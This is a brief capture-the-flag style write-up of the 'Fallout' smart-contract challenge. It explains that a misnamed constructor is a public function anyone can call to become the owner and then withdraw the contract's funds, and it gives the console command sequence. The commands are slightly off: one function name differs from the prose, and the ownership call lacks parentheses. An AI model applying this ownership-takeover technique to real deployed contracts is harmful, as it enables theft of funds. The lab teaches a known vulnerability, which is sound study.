# Fallout

## Description

This one is very easy. The "constructor" is just a regular function, meaning
that it can be called outside deployment. We call this function to set ourselves
as the owner and then call `collectAllocation()` to retrieve the funds.

## Command Sequence

```
> await contract.Fal1out
become owner
> await contract.collectAllocations()
collect funds
```
